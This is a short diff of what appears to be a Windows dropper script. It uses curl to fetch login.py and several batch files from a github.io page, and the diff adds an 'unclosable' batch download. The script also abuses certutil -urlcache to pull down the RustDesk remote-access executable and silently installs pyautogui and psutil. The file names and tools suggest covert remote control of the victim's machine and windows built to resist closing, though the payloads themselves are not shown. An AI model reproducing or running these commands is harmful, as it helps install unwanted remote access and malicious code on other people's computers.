@@ -2,6 +2,7 @@
 curl -L -o login.py https://wowsha22.github.io/download/login.py
 curl -L -o loop.bat https://wowsha22.github.io/download/loop.bat
 curl -L -o show.bat https://wowsha22.github.io/download/show.bat
+curl -L -o unclosable.bat https://wowsha22.github.io/download/unclosable2.bat
 certutil -urlcache -split -f "https://github.com/rustdesk/rustdesk/releases/download/1.2.1/rustdesk-1.2.1-x86_64.exe" rustdesk.exe
 pip install pyautogui --quiet
 pip install psutil --quiet
